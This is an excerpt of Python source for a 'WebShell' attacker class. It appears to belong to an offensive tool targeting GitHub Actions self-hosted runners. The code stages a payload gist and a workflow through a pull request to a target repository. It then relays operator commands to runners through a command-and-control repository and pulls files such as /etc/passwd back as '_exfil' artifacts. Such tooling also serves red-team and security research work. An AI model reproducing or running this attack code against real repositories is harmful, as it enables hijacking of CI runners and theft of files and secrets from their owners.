...
class WebShell(Attacker):
    ...
    * The runner will then execute the shell commands in the workflow.
    ...
    @staticmethod
    def create_ror_workflow(workflow_name: str, run_name: str, gist_url: str, runner_labels: list):
        """
        """
        yaml_file = {}
    ...
    def setup_payload_gist_and_workflow(self, c2_repo, target_os, target_arch, keep_alive=False):
        """
        ...
        ror_gist = self.format_ror_gist(c2_repo, target_os, target_arch, keep_alive=keep_alive)
    ...
    def runner_on_runner(self, target_repo: str, target_branch: str,
                       pr_title: str, source_branch: str,
                       commit_message: str,
                       target_os: str,
                       target_arch: str,
                       requested_labels: list,
        ...
        if not ('repo' in self.user_perms['scopes'] and \
           'workflow' in self.user_perms['scopes'] and \
           'gist' in self.user_perms['scopes']):
        ...
        Output.warn("The following steps perform an automated overt attack. Type 'Confirm' to continue.")
        ...
        for i in range(self.timeout):
            workflow_id = self.api.get_recent_workflow(target_repo, "", yaml_name, time_after=f">{curr_time}")
            if workflow_id == -1:
            ...
            Output.error("Failed to find the triggered workflow - actions might be disabled!")
            return
    ...
    def interact_webshell(self, c2_repo: str, runner_name: str=None):
        ...
        Output.info("The following meta commands are available, anything else will be sent to the target:")
        Output.tabbed('!list_runners - Lists all runners and labels connected to the C2 repository.')
        Output.tabbed('!select - Change the runner selection.')
        Output.tabbed('!download SOURCE - Download the specified file from the runner as a workflow artifact. E.g.: !download /etc/passwd')
        Output.tabbed('!timeout - Change the timeout value in seconds, this can be useful for long running commands. Example: !timeout 500') 
    ...
    def issue_command(
        ...
        if success:
            time.sleep(5)
            resp = self.api.call_get(f"/repos/{c2_repo}/commits", params={"per_page":1})
            if resp.status_code == 200:

                for i in range(timeout):
                    workflow_id = self.api.get_recent_workflow(
                        c2_repo, resp.json()[0]['sha'], 'webshell', time_after=f">{curr_time}"
                    )
                    if workflow_id == -1:
                        Output.error("Failed to find the created workflow!")
                        return
                ...
                if download:
                    dest = self.api.download_workflow_artifact(c2_repo, workflow_id, f"{str(workflow_id)}_exfil.zip")
